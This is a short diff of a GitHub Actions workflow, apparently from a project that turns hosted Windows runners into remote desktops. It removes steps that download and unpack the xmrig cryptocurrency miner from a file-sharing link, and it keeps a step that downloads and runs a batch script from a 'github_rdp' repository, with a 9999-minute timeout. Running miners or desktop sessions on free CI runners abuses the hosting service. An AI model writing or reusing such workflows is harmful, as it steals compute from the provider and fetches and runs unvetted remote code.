@@ -8,27 +8,8 @@ jobs:
     name: Start Building...
     runs-on: windows-latest
     timeout-minutes: 9999
-
+    
     steps:
-      - name: Download xmrig RAR File
-        run: |
-          Invoke-WebRequest -Uri "https://gofile.io/d/Jym2yJ" -OutFile "xmrig-6.21.3-msvc-win64.rar"
-          
-          # Verify the downloaded file
-          $fileSize = (Get-Item "xmrig-6.21.3-msvc-win64.rar").length
-          Write-Host "Downloaded file size: $fileSize bytes"
-
-      - name: Install 7-Zip
-        run: choco install -y 7zip
-
-      - name: Check 7-Zip Installation
-        run: |
-          & 'C:\Program Files\7-Zip\7z.exe' -version
-
-      - name: Extract xmrig RAR File to Downloads
-        run: |
-          & 'C:\Program Files\7-Zip\7z.exe' x xmrig-6.21.3-msvc-win64.rar -oC:\Users\runneradmin\Downloads -y
-
       - name: Downloading & Installing Essentials
         run: |
           Invoke-WebRequest -Uri "https://raw.githubusercontent.com/seifzaabare/lm_win-10_github_rdp/main/Downloads.bat" -OutFile "Downloads.bat"
